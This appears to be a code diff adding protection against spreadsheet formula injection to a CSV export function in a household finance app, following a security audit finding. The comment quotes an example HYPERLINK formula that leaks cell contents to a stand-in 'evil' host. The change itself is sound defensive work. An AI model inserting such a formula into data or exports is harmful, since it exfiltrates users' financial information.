@@ -31,10 +31,23 @@ function asString(value: unknown): string {
   return typeof value === 'string' ? value.trim() : '';
 }
 
-/** Quote-and-escape one CSV cell. Always-quote keeps the encoder dead simple. */
+/** Quote-and-escape one CSV cell. Always-quote keeps the encoder dead simple.
+ *
+ * F-22 (security audit 2026-05-25) — prefix cells starting with one of
+ * the spreadsheet "formula triggers" (= + - @ \t \r) with a single
+ * quote so Excel / Numbers / Sheets treat them as literal text
+ * instead of executing them. A household member with edit access
+ * could otherwise drop e.g. `=HYPERLINK("http://evil/?leak="&A1&B1)`
+ * into a transaction description that gets exfiltrated when the
+ * admin exports a CSV for taxes and opens it in Excel.
+ */
 function csvCell(value: unknown): string {
   if (value === null || value === undefined) return '""';
-  const s = String(value).replace(/"/g, '""');
+  let s = String(value);
+  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
+    s = `'${s}`;
+  }
+  s = s.replace(/"/g, '""');
   return `"${s}"`;
 }
 
